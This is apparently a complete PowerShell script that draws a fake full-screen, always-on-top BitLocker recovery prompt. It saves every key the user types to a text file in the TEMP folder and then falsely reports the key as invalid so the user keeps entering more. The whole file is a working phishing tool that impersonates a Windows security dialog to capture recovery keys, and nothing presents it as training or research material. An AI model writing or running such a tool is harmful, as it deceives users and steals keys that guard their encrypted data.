Add-Type -AssemblyName System.Windows.Forms

$form = New-Object Windows.Forms.Form
$form.Text = "BitLocker Recovery Key"
$form.BackColor = "Black"
$form.ForeColor = "White"
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.FormBorderStyle = 'None'

$label = New-Object Windows.Forms.Label
$label.Text = "Enter BitLocker Recovery Key:"
$label.ForeColor = "White"
$label.Font = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.Location = New-Object Drawing.Point(200, 200)
$form.Controls.Add($label)

$inputBox = New-Object Windows.Forms.TextBox
$inputBox.Location = New-Object Drawing.Point(200, 250)
$inputBox.Width = 400
$inputBox.UseSystemPasswordChar = $true
$form.Controls.Add($inputBox)

$okButton = New-Object Windows.Forms.Button
$okButton.Text = "Unlock"
$okButton.Location = New-Object Drawing.Point(200, 300)
$okButton.Add_Click({
    $key = $inputBox.Text
    $output = Join-Path $env:TEMP "bitlocker_key.txt"
    Set-Content -Path $output -Value $key -Encoding UTF8
    [System.Windows.Forms.MessageBox]::Show("Invalid key. Try again.", "BitLocker")
    $inputBox.Text = ""
})
$form.Controls.Add($okButton)

$form.ShowDialog()
